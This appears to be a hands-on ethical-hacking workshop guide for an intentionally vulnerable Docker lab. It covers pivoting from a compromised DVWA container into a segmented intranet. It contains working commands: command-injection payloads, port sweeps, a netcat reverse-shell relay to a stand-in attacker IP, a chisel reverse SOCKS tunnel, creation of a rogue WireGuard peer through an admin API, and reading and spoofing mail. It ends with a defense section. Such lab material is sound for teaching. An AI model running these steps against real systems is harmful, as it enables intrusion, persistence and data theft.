# Pivoting & Lateral Movement in the CyberRange

# Warning
This workshop is for educational purposes only, as part of WOCSA ethical hacking workshops. All techniques described here target the intentionally vulnerable CyberRange environment. Never use them against systems you do not own or do not have explicit written permission to test.

# Table of Contents
- [Pivoting & Lateral Movement in the CyberRange](#pivoting--lateral-movement-in-the-cyberrange)
- [Warning](#warning)
- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
- [Prerequisites](#prerequisites)
- [Lab topology recap](#lab-topology-recap)
- [Phase 1 - Foothold on DVWA](#phase-1---foothold-on-dvwa)
- [Phase 2 - Enumeration from the foothold](#phase-2---enumeration-from-the-foothold)
- [Phase 3 - Pivoting techniques](#phase-3---pivoting-techniques)
  - [Pivot 1: HTTP relay via DVWA (curl only)](#pivot-1-http-relay-via-dvwa-curl-only)
  - [Pivot 2: Reverse shell relayed through DVWA with netcat](#pivot-2-reverse-shell-relayed-through-dvwa-with-netcat)
  - [Pivot 3: Full dynamic SOCKS pivot](#pivot-3-full-dynamic-socks-pivot)
  - [Pivot 4: Mint your own VPN peer (become an employee)](#pivot-4-mint-your-own-vpn-peer-become-an-employee)
- [Phase 4 - Lateral movement goals](#phase-4---lateral-movement-goals)
- [Defense & detection](#defense--detection)
- [Takeaways checklist](#takeaways-checklist)
- [Resources](#resources)
- [Summary report](#summary-report)

# Introduction
Pivoting is the art of using a compromised machine as a stepping stone to reach networks that are not directly accessible from your attacker position. It sits right in the middle of the kill chain: after **initial foothold** and before **lateral movement / actions on objectives**. In a segmented enterprise, the web server you pwned almost never holds the crown jewels - but it is often the only machine with a foot in both the DMZ and the internal network.

The canonical story of the CyberRange is exactly that: **pwn DVWA from the outside -> pivot to the intranet -> own metasploitable2 / the workstations -> read the company mail**. Every other DMZ service stops at the DMZ boundary (Docker drops inter-bridge traffic), which is what a properly segmented network should do. DVWA, with its extra "misconfigured" network leg, fails to do it - and that makes it the star of this workshop.

# Prerequisites
- The CyberRange running: `cd CyberRange && docker compose up -d` (profiles `dmz` + `intranet` + `vpn`; profile options are documented in `CyberRange/README.md`).
- DVWA reachable at `http://localhost:8081`.
- A machine to attack from: your own laptop, the optional `kali-cai` attacker box of the range, or any host with `curl`, `nc` and Python.
- A VPN peer for yourself (optional - it is the "legitimate" way in, useful to compare with the attack paths below): admin UI at `http://localhost:51821`, credentials in `CyberRange/.env`.

# Lab topology recap
The range is split into three Docker networks. DVWA is the **only** service with a leg in all three.

| Zone | Subnet | Hosts | Reachability |
|---|---|---|---|
| DMZ | `10.5.10.0/24` | corporate-site `.10`, juice-shop `.11`, dvwa `.12`, mailpit `.13` | published on `localhost` ports, no VPN needed |
| DB tier | `10.5.15.0/24` | dvwa-db `.10`, dvwa `.20` | DVWA only (dvwa-db:3306) |
| Intranet | `10.5.20.0/24` | wg-easy `.2`, dokuwiki `.10`, sftpgo `.11`, metasploitable2 `.12`, grafana `.14`, prometheus `.15`, blackbox `.16`, dvwa `.20`, workstations `.21`/`.22` | VPN only - except for DVWA's third leg |

Verified reachability facts you can rely on:
- A DMZ-only service (juice-shop, corporate-site, mailpit) **cannot** reach `10.5.20.x` or `10.5.15.x`.
- DVWA **can** reach the whole intranet: `10.5.20.10` (HTTP 200), `10.5.20.12` (many open ports), `10.5.20.2:51821` (401 unauth = reachable).
- DVWA's container has `nc` (OpenBSD variant), `curl`, `python3` and `php`. No `wget`, no `ssh`, no `socat` - adapt your tooling accordingly.
- Two documented exceptions worth knowing (see `CyberRange/README.md`): blackbox-exporter is dual-homed (`10.5.10.20:9115`, abusable `/probe` endpoint) and grafana stores the wg-easy + mailpit API credentials in its provisioned Infinity datasource.

# Phase 1 - Foothold on DVWA
1. Open `http://localhost:8081` and log in with `admin` / `password`.
2. On a **first run** (fresh `docker compose down -v` or new dvwa-db), the login redirects to `/setup.php`: click **"Create / Reset Database"** once, then log in again.
3. `DVWA_SECURITY_LEVEL=low` is the default - keep it for this workshop.
4. To get a real command shell on DVWA (instead of `docker exec`, which is fine too while you are the lab operator), use the **Command Injection** module at low security:
   ```
   127.0.0.1; id
   127.0.0.1; hostname -I
   ```
   Or upload a simple PHP webshell through the **File Upload** module and call it from `/hackable/uploads/`.
5. For the rest of the workshop you can simulate the pwned shell with:
   ```bash
   docker exec -it cyberrange-dvwa sh
   ```

# Phase 2 - Enumeration from the foothold
First, prove DVWA is tri-homed. From the host:
```bash
docker inspect cyberrange-dvwa | grep -E "10\.5\.(10|15|20)\."
```
You should see all three legs: `10.5.10.12` (DMZ), `10.5.15.20` (db-tier), `10.5.20.20` (intranet). From inside the container, `hostname -I` confirms it too.

There is no `nmap`/`arp-scan` inside DVWA, but `php` and `python3` are. Find live hosts on `10.5.20.0/24` by testing port 80:

PHP one-liner (works straight from the DVWA webshell):
```bash
php -r 'for($i=1;$i<255;$i++){ $f=@fsockopen("10.5.20.$i",80,$e,$s,0.1); if($f){ echo "10.5.20.$i port 80 OPEN\n"; fclose($f);} }'
```

Python3 alternative (inside `docker exec cyberrange-dvwa sh`):
```bash
python3 -c "
import socket
for i in range(1,255):
    ip = '10.5.20.%d' % i
    s = socket.socket(); s.settimeout(0.2)
    if s.connect_ex((ip,80)) == 0: print(ip, '80 open')
    s.close()
"
```
Expect at least `.10` (dokuwiki), `.12` (metasploitable2 Apache) and `.20` (yourself). Then probe a few known ports (`.2:51821`, `.11:8080`, `.12` full sweep with a port list, `.14:3000`) the same way.

# Phase 3 - Pivoting techniques

## Pivot 1: HTTP relay via DVWA (curl only)
The simplest pivot: run `curl` on the pwned box. No special tooling, just a command channel (docker exec, webshell, or the Command Injection module with `; curl ...`).

```bash
# Wiki (dokuwiki) - first run shows the install wizard
docker exec cyberrange-dvwa curl -s -I http://10.5.20.10/
docker exec cyberrange-dvwa curl -s http://10.5.20.10/install.php | head -20

# Metasploitable2 web roots
docker exec cyberrange-dvwa curl -s -I http://10.5.20.12/
docker exec cyberrange-dvwa curl -s -I http://10.5.20.12:8180/

# wg-easy admin UI is reachable (401 = alive, needs auth)
docker exec cyberrange-dvwa curl -s -o /dev/null -w "%{http_code}\n" http://10.5.20.2:51821/

# sftpgo web UI
docker exec cyberrange-dvwa curl -s -o /dev/null -w "%{http_code}\n" http://10.5.20.11:8080/
```
Notes:
- `10.5.20.10/install.php` means the wiki has never been configured: run the wizard (through the VPN, or from DVWA's curl by replaying the POSTs) and it becomes an internal knowledge base - a goldmine of employee notes.
- This pivot is "static": every request is one curl invocation. Fine for enumeration and data theft, useless for interactive shells. The next pivots solve that.

## Pivot 2: Reverse shell relayed through DVWA with netcat
metasploitable2 lives deep in the intranet: it cannot connect directly to your laptop, and you cannot connect to it. DVWA, however, is dual-homed. Use it as the middle box.

On your laptop (attacker), open a listener:
```bash
nc -lvp 4445
```
On DVWA (the middle box), start a listener that pipes everything to you:
```bash
docker exec cyberrange-dvwa sh -c 'nc -lvp 4444 | nc <ATTACKER_IP> 4445'
```
Replace `<ATTACKER_IP>` with an address DVWA can reach: your host's LAN IP or `host.docker.internal` (Docker Desktop).

Finally, on metasploitable2, fire the shell back through the relay (connect from your VPN access or from DVWA's curl to port 1524 - the built-in root bindshell, verified: `printf "id\n" | nc 10.5.20.12 1524` answers `uid=0(root)` - if you want a bootstrap shell first):
```bash
nc 10.5.20.20 4444 -e /bin/sh
```
Your `nc -lvp 4445` should receive the ms2 shell: `id` -> `uid=0(root)`. The command is relayed like this: `ms2 -> 10.5.20.20:4444 -> DVWA -> <ATTACKER_IP>:4445`.

For a fully interactive (bidirectional) relay, upgrade the middle box with a FIFO:
```bash
docker exec cyberrange-dvwa sh -c 'mkfifo /tmp/p; nc -lvp 4444 </tmp/p | nc <ATTACKER_IP> 4445 >/tmp/p'
```
Why the middle box matters: ms2 has no route to your laptop (segmentation), and you have no route to ms2 (no VPN). DVWA breaks the isolation because of its third leg - exactly the misconfiguration this workshop is about. Also note the OpenBSD `nc` on DVWA has no `-e`, so relays must use pipes/FIFOs; ms2's traditional netcat does have `-e`.

## Pivot 3: Full dynamic SOCKS pivot
A SOCKS proxy on the pivot lets you use **all** your local tools (`nmap`, `curl`, browsers) through the tunnel as if you were on DVWA. The classic tool is SSH:
```bash
ssh -D 9050 user@10.5.20.12     # SOCKS proxy on localhost:9050
proxychains nmap -sT -Pn 10.5.20.10
```
But **DVWA has no SSH server**. This works against any SSH host (metasploitable2, sftpgo, the workstations) once you have credentials there.

For DVWA itself, use its `python3` instead:
- **Option A - reverse SOCKS with chisel** (DVWA can reach the Internet, it is in the DMZ). Download a static chisel binary with curl and run:
  ```bash
  # on your laptop
  ./chisel server --reverse --port 8082
  # on DVWA
  curl -LO https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
  gunzip chisel_1.9.1_linux_amd64.gz && chmod +x chisel_1.9.1_linux_amd64
  ./chisel_1.9.1_linux_amd64 client <ATTACKER_IP>:8082 R:socks
  # now on your laptop: proxychains curl http://10.5.20.10/
  ```
- **Option B - python3 relay scripts**: if internet is not available from DVWA, upload small `python3` TCP-relay/socks snippets through the DVWA **File Upload** module and run them with `python3 /tmp/relay.py`. The same FIFO trick as Pivot 2 generalized to many ports (a listener per intranet port, each piped to your host).

## Pivot 4: Mint your own VPN peer (become an employee)
Once DVWA is pwned, the cleanest lateral move is to stop pivoting altogether and become a legitimate network member. wg-easy's admin UI is reachable from the intranet leg (`10.5.20.2:51821`) and its API only needs Basic auth. The password lives in `CyberRange/.env` (`WG_ADMIN_PASSWORD`) - and, in the range, it is also leaked by grafana's provisioned Infinity datasource (default `admin`/`admin`, dashboard credentials for the 51821 UI). Get it either way, then from DVWA:

```bash
# 1. List current VPN peers (verify credentials)
docker exec cyberrange-dvwa curl -s -u "admin:<WG_ADMIN_PASSWORD>" http://10.5.20.2:51821/api/client

# 2. Create your own peer
docker exec cyberrange-dvwa curl -s -u "admin:<WG_ADMIN_PASSWORD>" \
  -X POST http://10.5.20.2:51821/api/client \
  -H "Content-Type: application/json" \
  -d '{"name":"pivot-proof","expiresAt":null}'

# 3. (cleanup after the exercise) delete it, using the id returned by step 2
docker exec cyberrange-dvwa curl -s -u "admin:<WG_ADMIN_PASSWORD>" \
  -X DELETE http://10.5.20.2:51821/api/client/<id>
```
Retrieve the peer configuration (documented in the wg-easy API) and import it into your WireGuard client: you now route `10.5.20.0/24` from your own laptop - the attacker "became an employee". This is why `WG_ADMIN_PASSWORD` has no default and why the admin UI deserves a dedicated loopback binding (see the CyberRange README, "Pivoting and isolation").

# Phase 4 - Lateral movement goals
Choose your own adventure, all from the pivoted position:
- **Own metasploitable2** (`10.5.20.12`): `msfadmin` / `msfadmin` over SSH or telnet; or the famous root bindshell on port `1524`:
  ```bash
  docker exec cyberrange-dvwa sh -c 'echo id | nc 10.5.20.12 1524'
  ```
  Then enumerate its many services (21, 22, 23, 25, 111, 139, 445, 512-514, 1099, 2121, 3306, 3632, 5432, 6667, 6697, 8009, 8180, 8787) for more practice.
- **Own the workstations** (`https://10.5.20.21:3001`, `https://10.5.20.22:3001`): first steal credentials from grafana (`10.5.20.14:3000`, `admin`/`admin` -> provisioned dashboards and Infinity datasource hold wg-easy/mailpit API creds), then log into the desktops.
- **Read the company mail** (mailpit, reachable from DVWA on the DMZ leg):
  ```bash
  docker exec cyberrange-dvwa curl -s http://10.5.10.13:8025/api/v1/messages
  docker exec cyberrange-dvwa curl -s http://10.5.10.13:8025/api/v1/message/<ID>/raw
  docker exec cyberrange-dvwa curl -s -X POST http://10.5.10.13:8025/api/v1/send \
    -H "Content-Type: application/json" \
    -d '{"to":[{"email":"ceo@wocsa-corp.local"}],"subject":"Urgent","text":"spoofed"}'
  ```

# Defense & detection
- **Verify the segmentation works**: from a DMZ-only container, the intranet must be unreachable:
  ```bash
  docker exec cyberrange-corporate-site wget -qO- --timeout=2 http://10.5.20.10/ ; echo "exit=$?"
  docker exec cyberrange-corporate-site wget -qO- --timeout=2 http://10.5.15.10/ ; echo "exit=$?"
  ```
  Both fail - unlike the same commands on DVWA. This is the single most important lesson: DVWA is reachable *because* someone gave it three legs.
- **Least privilege network legs**: DMZ apps need a DMZ leg, not an intranet one. Databases need a private tier reachable only by their application. Review every container's networks like a firewall rule.
- **Why monitoring would spot the pivot**: the range's own grafana dashboards and blackbox exporter watch every service; a flood of new connections from `10.5.20.20` to unusual ports, a new wg-easy peer named `pivot-proof`, or mailpit API hits from a web container are all visible anomalies. A SOC would correlate exactly these events.
- **Patch and segment DVWA**: it is intentionally vulnerable (low security level, command injection, file upload) - in production it should be patched, hardened, and, above all, stripped of its intranet leg.

# Takeaways checklist
- [ ] Logged into DVWA at `localhost:8081` (`admin`/`password`), ran setup.php on first boot
- [ ] Confirmed DVWA's three legs with `docker inspect`
- [ ] Enumerated `10.5.20.0/24` from DVWA with the php/python3 port-80 sweep
- [ ] Reached the wiki (`10.5.20.10`), metasploitable2 (`10.5.20.12`) and wg-easy (`10.5.20.2:51821`) through the curl relay
- [ ] Caught a metasploitable2 root shell through the DVWA nc relay
- [ ] Set up a SOCKS pivot (ssh `-D` on an SSH host, or chisel/python3 on DVWA) and browsed the intranet with `proxychains`
- [ ] Minted and then deleted a WireGuard peer via the wg-easy API
- [ ] Verified that a DMZ-only container cannot reach the intranet
- [ ] Read company mail through the mailpit API

# Resources
- [wg-easy documentation & API](https://github.com/wg-easy/wg-easy)
- [CyberRange README (topology, profiles, isolation rules)](../../CyberRange/README.md)
- [PayloadsAllTheThings - Network Pivoting Techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)
- [Chisel (fast TCP/UDP tunnel over HTTP)](https://github.com/jpillora/chisel)
- [proxychains](https://github.com/haad/proxychains)
- [Metasploitable2 guide](https://docs.rapid7.com/metasploitable/)

# Summary report
Pwned DVWA at `localhost:8081`, confirmed its intranet leg `10.5.20.20`, enumerated `10.5.20.0/24`, relayed HTTP and a root reverse shell from metasploitable2 through DVWA, established a SOCKS pivot, minted a wg-easy VPN peer via the verified API, and exfiltrated company mail from `10.5.10.13:8025` - while DMZ-only containers stayed locked out of the intranet.
